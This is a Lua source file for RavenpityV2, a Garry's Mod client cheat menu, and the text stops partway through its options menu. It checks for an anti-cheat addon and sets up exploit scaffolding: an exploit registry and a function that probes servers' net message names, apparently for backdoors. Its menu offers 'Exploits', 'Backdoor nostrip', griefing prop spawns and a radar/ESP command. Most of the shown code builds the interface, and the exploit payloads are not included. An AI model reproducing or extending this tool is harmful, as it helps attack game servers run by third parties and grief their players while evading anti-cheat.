
/*==________  ________  ___      ___ _______   ________   ________  ___  _________    ___    ___ 
|\   __  \|\   __  \|\  \    /  /|\  ___ \ |\   ___  \|\   __  \|\  \|\___   ___\ |\  \  /  /|
\ \  \|\  \ \  \|\  \ \  \  /  / | \   __/|\ \  \\ \  \ \  \|\  \ \  \|___ \  \_| \ \  \/  / /
\ \   _  _\ \   __  \ \  \/  / / \ \  \_|/_\ \  \\ \  \ \   ____\ \  \   \ \  \   \ \    / / 
\ \  \\  \\ \  \ \  \ \    / /   \ \  \_|\ \ \  \\ \  \ \  \___|\ \  \   \ \  \   \/  /  /  
\ \__\\ _\\ \__\ \__\ \__/ /     \ \_______\ \__\\ \__\ \__\    \ \__\   \ \__\__/  / /    by Hoper
\|__|\|__|\|__|\|__|\|__|/       \|_______|\|__| \|__|\|__|     \|__|    \|__|\___/ /     
\|___|/    ==*/    




hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

/*======================================================================================================================================================================================
Menu Files
========================================================================================================================================================================================*/                               




if file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true then
LocalPlayer():ChatPrint( "Cake-Anticheat détecter" )
else
LocalPlayer():ChatPrint( "Ravenpity chargé avec succès" )
end
MsgC (Color(208, 114, 255), [[
                         
                                            
_      `-._     `-.     `.   \      :      /   .'     .-'     _.-'      _
`--._     `-._    `-.    `.  `.    :    .'  .'    .-'    _.-'     _.--'
`--._    `-._   `-.   `.  \   :   /  .'   .-'   _.-'    _.--'
`--.__     `--._   `-._  `-.  `. `. : .' .'  .-'  _.-'   _.--'     __.--'
__    `--.__    `--._  `-._ `-. `. \:/ .' .-' _.-'  _.--'    __.--'    __
`--..__   `--.__   `--._ `-._`-.`_=_'.-'_.-' _.--'   __.--'   __..--'
--..__   `--..__  `--.__  `--._`-q(-_-)p-'_.--'  __.--'  __..--'   __..--
``--..__  `--..__ `--.__ `-'_) (_`-' __.--' __..--'  __..--''
...___        ``--..__ `--..__`--/__/  \--'__..--' __..--''        ___...
```---...___    ``--..__`_(<_   _/)_'__..--''    ___...---'''
```-----....._____```---...___(__\_\_|_/__)___...---'''_____.....--'''
_____       __      ________ _   _ _____ _____ _________     __
'''-|  __ \     /\ \    / /  ____| \ | |  __ \_   _|__   __\ \   / /-'''   
'''-| |__) |   /  \ \  / /| |__  |  \| | |__) || |    | |   \ \_/ /-'''
'''-|  _  /   / /\ \ \/ / |  __| | . ` |  ___/ | |    | |    \   /-'''
'''-| | \ \  / ____ \  /  | |____| |\  | |    _| |_   | |     | |-'''
'''-|_|  \_\/_/    \_\/   |______|_| \_|_|   |_____|  |_|     |_|-'''
-----------------------------------------------------------------------     
-----------------------------------V2----------------------------------
-----------------------------------------------------------------------
-----------------------------------------------------------------------
                              o8%8888,                          
____  ______  _____ _______   o88%8888888.     _____ __  __  ____  _____                     
|  _ \|  ____|/ ____|__   __|8'-    -:8888b   / ____|  \/  |/ __ \|  __ \                  
| |_) | |__  | (___    | |  8'         8888  | |  __| \  / | |  | | |  | |                
|  _ <|  __|  \___ \   | |  d8.-=. ,==-.:888b| | |_ | |\/| | |  | | |  | |                
| |_) | |____ ____) |  | |  >8 `~` :`~' d8888| |__| | |  | | |__| | |__| |                 
|____/|______|_____/   |_|  88         ,88888 \_____|_|  |_|\____/|_____/ 
                           88b. `-~  ':88888                
__  __  ____  _____        888b v=v~ .:88888     __  __ ______ _   _ _    _                    
|  \/  |/ __ \|  __ \      88888o--:':::8888    |  \/  |  ____| \ | | |  | |                 
| \  / | |  | | |  | |     `88888| :::' 8888b   | \  / | |__  |  \| | |  | |                 
| |\/| | |  | | |  | |     8888^^'       8888b  | |\/| |  __| | . ` | |  | |
| |  | | |__| | |__| |    d888           ,%888  | |  | | |____| |\  | |__| |          
|_|  |_|\____/|_____/    d88%            %%%8-- |_|  |_|______|_| \_|\____/        
                        88:.__ ,       _%-' ---  -       
                       '''::===..-'   =  --.  `     

]]) 
/*======================================================================================================================================================================================
Start
========================================================================================================================================================================================*/
local blur = Material("pp/blurscreen")
local function DrawBlur(panel, amount)
local x, y = panel:LocalToScreen(0, 0)
local scrW, scrH = ScrW(), ScrH()
surface.SetDrawColor(255, 255, 255)
surface.SetMaterial(blur)
for i = 1, 60 do
blur:SetFloat("$blur", (i / 60) * (amount or 6))
blur:Recompute()
render.UpdateScreenEffectTexture()
surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
end
end
local RatesScaleLevel = LocalPlayer():SteamID()
local RAVEN = {}
RAVEN.memory = {}
local ctext = chat.AddText
local netKey = ""
BackdoorsFound = 0
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
function RAVEN.NetStart( str )
local netstart = net.Start
if ravenhacknet and ravenhacknet.G and ravenhacknet.G.net then
netstart = ravenhacknet.G.net.Start
else
end
return netstart( str )
end
function RAVEN.ValidNetString( str )
local netstart = net.Start
if ravenhacknet and ravenhacknet.G and ravenhacknet.G.net then
netstart = ravenhacknet.G.net.Start
else
end
local status, error = pcall( netstart, str )
return status
end
function RAVEN.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
RAVEN.sploits = {}
function RAVEN.AddExploit( name, tab )
if !isstring( name ) then print("ùùù_ùùù") return end
if !istable( tab ) then print("ùùù_ùùù") return end
RAVEN.sploits[name] = tab
end
function RAVEN.IsStored( addr )
return RAVEN.memory[addr] != nil
end
function RAVEN.GetStored( addr, fallback )
if fallback and RAVEN.memory[addr] == nil then return fallback end
return RAVEN.memory[addr]
end
function RAVEN.ChatText( str )
ctext( Color(190, 190, 190), [[ [Ravenpity ]]..str )
end
function RAVEN.Store( addr, val )
RAVEN.memory[addr] = val
end
function RAVEN.GetAllStored()
return RAVEN.memory
end
function RAVEN.GetAllStoredData()
local ret = {}
for k, v in pairs( RAVEN.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
local severitycols = {
[1] = Color( 120, 120, 120 ),
[2] = Color( 120, 120, 120 ),
[3] = Color( 120, 120, 120 ),
[4] = Color( 120, 120, 120 ),
}
/*======================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
HOME
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================*/local ravenhacknet = nil 

concommand.Add( "ravenpity_start", function()
surface.PlaySound("UI/buttonrollover.wav")
local HomeBaseHeader = vgui.Create( "DFrame")
HomeBaseHeader:SetPos( 2000, 0)
HomeBaseHeader:SetSize( 400, 120  )
HomeBaseHeader:SetTitle( "" )
HomeBaseHeader:MoveTo( ScrW()-400, ScrH, 0.23)
HomeBaseHeader:SetDraggable( false )
HomeBaseHeader:MakePopup()
HomeBaseHeader:ShowCloseButton( false )
HomeBaseHeader.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
end
HomeHTMLPanel = vgui.Create( "HTML", HomeBaseHeader )
HomeHTMLPanel:SetPos( 120,0 )
HomeHTMLPanel:SetSize( 200,200 )
HomeHTMLPanel:OpenURL( "https://image.noelshack.com/fichiers/2018/13/2/1522167430-logoravenpity.png")
local   HomeBackgroundSupportPanel = vgui.Create( "DFrame", HomeBaseHeader)
HomeBackgroundSupportPanel:SetPos( 2000,120)
HomeBackgroundSupportPanel:SetSize( 400, 400  )
HomeBackgroundSupportPanel:MoveTo( ScrW()-HomeBaseHeader:GetWide(), 120, 0.2)
HomeBackgroundSupportPanel:SetTitle( "" )
HomeBackgroundSupportPanel:ShowCloseButton( false ) 
HomeBackgroundSupportPanel:SetDraggable( false )  
HomeBackgroundSupportPanel:MakePopup()
HomeBackgroundSupportPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 240))
end
local   HomeBackgroundSupportPanelBase = vgui.Create( "DFrame", HomeBaseHeader)
HomeBackgroundSupportPanelBase:SetPos(2000,120)
HomeBackgroundSupportPanelBase:SetSize( 400, 400  )
HomeBackgroundSupportPanelBase:MoveTo( ScrW()-HomeBaseHeader:GetWide(), 120, 0.2)
HomeBackgroundSupportPanelBase:SetTitle( "" )
HomeBackgroundSupportPanelBase:ShowCloseButton( false ) 
HomeBackgroundSupportPanelBase:SetDraggable( false )
HomeBackgroundSupportPanelBase:MakePopup()
HomeBackgroundSupportPanelBase.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
end
local   UnderDermaPanel = vgui.Create( "DFrame", HomeBaseHeader)
UnderDermaPanel:SetPos( 2000, 520)
UnderDermaPanel:SetSize( 400, 30  )
UnderDermaPanel:MoveTo( ScrW()-HomeBaseHeader:GetWide(), 520, 0.2)
UnderDermaPanel:SetTitle( "" )
UnderDermaPanel:ShowCloseButton( false ) 
UnderDermaPanel:SetDraggable( false )
UnderDermaPanel:MakePopup()
UnderDermaPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
draw.SimpleTextOutlined( "RavenpityV2 | ©Hoper", "ravenfontunder", 201, 15, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, 0) )
end
local   ExploitsButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
ExploitsButton:SetPos( 0, 0)
ExploitsButton:SetSize( 400, 30  )
ExploitsButton:SetText( "Exploits" )
ExploitsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ExploitsButton:IsHovered() then
ExploitsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ExploitsButton:SetTextColor( Color( 154, 99, 255 ) )        
end
ExploitsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
LocalPlayer():ConCommand("stringraven_exploit")
HomeBaseHeader:Remove()
end
end
local   BackdoorButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
BackdoorButton:SetPos( 0, 30)
BackdoorButton:SetSize( 400, 30  )
BackdoorButton:SetText( "Backdoor nostrip" )
BackdoorButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if BackdoorButton:IsHovered() then
BackdoorButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
BackdoorButton:SetTextColor( Color( 154, 99, 255 ) )        
end
BackdoorButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
LocalPlayer():ConCommand("stringraven_backdoor")
HomeBaseHeader:Remove()
end
end
local   SpawnOptionsButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
SpawnOptionsButton:SetPos( 0, 60)
SpawnOptionsButton:SetSize( 400, 30  )
SpawnOptionsButton:SetText( "Troll Spawn" )
SpawnOptionsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if SpawnOptionsButton:IsHovered() then
SpawnOptionsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
SpawnOptionsButton:SetTextColor( Color( 255, 255, 255 ) )       
end
SpawnOptionsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.SpawnOptions( addr )
HomeBackgroundSupportPanelBase:Remove()
end
end
local   CommandesButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
CommandesButton:SetPos( 0, 90)
CommandesButton:SetSize( 400, 30  )
CommandesButton:SetText( "Options" )
CommandesButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CommandesButton:IsHovered() then
CommandesButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CommandesButton:SetTextColor( Color( 255, 255, 255 ) )        
end
CommandesButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.Commandes( addr )
HomeBackgroundSupportPanelBase:Remove()
end
end
local InformationsButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
InformationsButton:SetPos( 0, 120 )
InformationsButton:SetSize( 400, 30  )
InformationsButton:SetText( "Informations" )
InformationsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if InformationsButton:IsHovered() then
InformationsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
InformationsButton:SetTextColor( Color(255, 255, 255) )        
end
InformationsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.Informations( addr )
HomeBackgroundSupportPanelBase:Remove()
end
end
local   CopyRightText = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
CopyRightText:SetPos( 0, 270)
CopyRightText:SetSize( 400, 30  )
CopyRightText:SetText( "hoperdev.fr" )
CopyRightText:SetFont( "ravenfontcopyright" )
CopyRightText.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CopyRightText:IsHovered() then
CopyRightText:SetTextColor( HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 0))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CopyRightText:SetTextColor( Color( 255, 255, 255, 2 ) )       
end
CopyRightText.DoClick = function()
gui.OpenURL( "http://hoperdev.fr" )
end
end
local   HomeCloseButton = vgui.Create( "DButton", HomeBackgroundSupportPanelBase)
HomeCloseButton:SetPos( 0, 370)
HomeCloseButton:SetSize( 400, 30  )
HomeCloseButton:SetText( "X" )
HomeCloseButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if HomeCloseButton:IsHovered() then
HomeCloseButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
HomeCloseButton:SetTextColor( Color( 255, 255, 255 ) )        
end
HomeCloseButton.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
HomeBaseHeader:Remove()
end
end

/*======================================================================================================================================================================================
Spawn Options
========================================================================================================================================================================================*/
function RAVEN.SpawnOptions()
if RAVEN.SpawnOptionsListe and RAVEN.SpawnOptionsListe:IsVisible() then RAVEN.SpawnOptionsListe:Remove() end
RAVEN.SpawnOptionsListe = vgui.Create("DFrame")
RAVEN.SpawnOptionsListe:SetSize(682,350)
RAVEN.SpawnOptionsListe:SetTitle("")
RAVEN.SpawnOptionsListe:SetPos( 342, 250 )
RAVEN.SpawnOptionsListe:MakePopup()
RAVEN.SpawnOptionsListe:ShowCloseButton( false ) 
RAVEN.SpawnOptionsListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonSpawnOptions = vgui.Create( "DButton", HomeBackgroundSupportPanel)
CloseButtonSpawnOptions:SetPos( 0, 370)
CloseButtonSpawnOptions:SetSize( 400, 30  )
CloseButtonSpawnOptions:SetText( "X" )
CloseButtonSpawnOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonSpawnOptions:IsHovered() then
CloseButtonSpawnOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonSpawnOptions:SetTextColor( Color( 255, 255, 255 ) )        
end
CloseButtonSpawnOptions.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
HomeBaseHeader:Remove()
end
end
local   ReturnButtonSpawnOptions = vgui.Create( "DButton", HomeBackgroundSupportPanel)
ReturnButtonSpawnOptions:SetPos( 0, 340)
ReturnButtonSpawnOptions:SetSize( 400, 30  )
ReturnButtonSpawnOptions:SetText( "<--" )
ReturnButtonSpawnOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonSpawnOptions:IsHovered() then
ReturnButtonSpawnOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonSpawnOptions:SetTextColor( Color( 255, 255, 255 ) )       
end
ReturnButtonSpawnOptions.DoClick = function()
HomeBaseHeader:Remove()
LocalPlayer():ConCommand("ravenpity_start")
end
end

-------------------------------------------------------------------------------------|

local   startundo = vgui.Create( "DButton", HomeBackgroundSupportPanel)
startundo:SetPos( 0, 0)
startundo:SetSize( 400, 30  )
startundo:SetText( "Undo" )
startundo.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startundo:IsHovered() then
startundo:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startundo:SetTextColor( Color(154, 99, 255) )       
end
startundo.DoClick = function()
LocalPlayer():ConCommand("undo")
end
end

-------------------------------------------------------------------------------------|

local   spawnlogogmod = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnlogogmod:SetPos( 0, 30)
spawnlogogmod:SetSize( 400, 30  )
spawnlogogmod:SetText( "Logo Garry's Mod" )
spawnlogogmod.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnlogogmod:IsHovered() then
spawnlogogmod:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnlogogmod:SetTextColor( Color(  255, 255, 255 ) )       
end
spawnlogogmod.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/maxofs2d/logo_gmod_b.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnsky = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnsky:SetPos( 0, 60)
spawnsky:SetSize( 400, 30  )
spawnsky:SetText( "Ciel Rouge" )
spawnsky.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnsky:IsHovered() then
spawnsky:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnsky:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnsky.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_combine/portalskydome.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnbuildings_a = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnbuildings_a:SetPos( 0, 90)
spawnbuildings_a:SetSize( 400, 30  )
spawnbuildings_a:SetText( "Immeuble 1" )
spawnbuildings_a.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnbuildings_a:IsHovered() then
spawnbuildings_a:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnbuildings_a:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnbuildings_a.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/row_res_1_fullscale.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnbuildings_b = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnbuildings_b:SetPos( 0, 120)
spawnbuildings_b:SetSize( 400, 30  )
spawnbuildings_b:SetText( "Immeuble 2" )
spawnbuildings_b.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnbuildings_b:IsHovered() then
spawnbuildings_b:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnbuildings_b:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnbuildings_b.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/collapsedbuilding02b.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnbuildings_c = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnbuildings_c:SetPos( 0, 150)
spawnbuildings_c:SetSize( 400, 30  )
spawnbuildings_c:SetText( "Immeuble 3" )
spawnbuildings_c.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnbuildings_c:IsHovered() then
spawnbuildings_c:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnbuildings_c:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnbuildings_c.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/project_building02.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnbuildings_d = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnbuildings_d:SetPos( 0, 180)
spawnbuildings_d:SetSize( 400, 30  )
spawnbuildings_d:SetText( "Immeuble 4" )
spawnbuildings_d.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnbuildings_d:IsHovered() then
spawnbuildings_d:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnbuildings_d:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnbuildings_d.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_buildings/building_002a.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnmicroprops = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnmicroprops:SetPos( 0, 210)
spawnmicroprops:SetSize( 400, 30  )
spawnmicroprops:SetText( "Micro Props" )
spawnmicroprops.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnmicroprops:IsHovered() then
spawnmicroprops:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnmicroprops:SetTextColor( Color(  255, 255, 255 ) )       
end
spawnmicroprops.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props/cs_office/plant01_gib1.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawnbugatti = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawnbugatti:SetPos( 0, 240)
spawnbugatti:SetSize( 400, 30  )
spawnbugatti:SetText( "Bugatti Veyron" )
spawnbugatti.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawnbugatti:IsHovered() then
spawnbugatti:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawnbugatti:SetTextColor( Color(  255, 255, 255 ) )        
end
spawnbugatti.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/tdmcars/bug_veyronss.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawntree_a = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawntree_a:SetPos( 0, 270)
spawntree_a:SetSize( 400, 30  )
spawntree_a:SetText( "Arbre 1" )
spawntree_a.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawntree_a:IsHovered() then
spawntree_a:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawntree_a:SetTextColor( Color(  255, 255, 255 ) )       
end
spawntree_a.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_foliage/tree_poplar_01.mdl")
end
end

-------------------------------------------------------------------------------------|

local   spawntree_b = vgui.Create( "DButton", HomeBackgroundSupportPanel)
spawntree_b:SetPos( 0, 300)
spawntree_b:SetSize( 400, 30  )
spawntree_b:SetText( "Arbre 2" )
spawntree_b.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spawntree_b:IsHovered() then
spawntree_b:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spawntree_b:SetTextColor( Color(  255, 255, 255 ) )       
end
spawntree_b.DoClick = function()
LocalPlayer():ConCommand("gm_spawn models/props_foliage/tree_cliff_02a.mdl")
end
end
end


/*======================================================================================================================================================================================
Commandes Options
========================================================================================================================================================================================*/
function RAVEN.Commandes()
if RAVEN.CommandesListe and RAVEN.CommandesListe:IsVisible() then RAVEN.CommandesListe:Remove() end
RAVEN.CommandesListe = vgui.Create("DFrame")
RAVEN.CommandesListe:SetSize(682,350)
RAVEN.CommandesListe:SetTitle("")
RAVEN.CommandesListe:SetPos( 342, 250 )
RAVEN.CommandesListe:MakePopup()
RAVEN.CommandesListe:ShowCloseButton( false ) 
RAVEN.CommandesListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonCommandes = vgui.Create( "DButton", HomeBackgroundSupportPanel)
CloseButtonCommandes:SetPos( 0, 370)
CloseButtonCommandes:SetSize( 400, 30  )
CloseButtonCommandes:SetText( "X" )
CloseButtonCommandes.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonCommandes:IsHovered() then
CloseButtonCommandes:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonCommandes:SetTextColor( Color( 255, 255, 255 ) )       
end
CloseButtonCommandes.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
HomeBaseHeader:Remove()
end
end
local   ReturnButtonCommandes = vgui.Create( "DButton", HomeBackgroundSupportPanel)
ReturnButtonCommandes:SetPos( 0, 340)
ReturnButtonCommandes:SetSize( 400, 30  )
ReturnButtonCommandes:SetText( "<--" )
ReturnButtonCommandes.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonCommandes:IsHovered() then
ReturnButtonCommandes:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonCommandes:SetTextColor( Color( 255, 255, 255 ) )        
end
ReturnButtonCommandes.DoClick = function()
HomeBaseHeader:Remove()
LocalPlayer():ConCommand("ravenpity_start")
end
end

-------------------------------------------------------------------------------------|

local   radaron = vgui.Create( "DButton", HomeBackgroundSupportPanel)
radaron:SetPos( 0, 0)
radaron:SetSize( 400, 30  )
radaron:SetText( "Radar" )
radaron.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if radaron:IsHovered() then
radaron:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
radaron:SetTextColor( Color(  255, 255, 255 ) )       
end
radaron.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_radarfov 1500" )
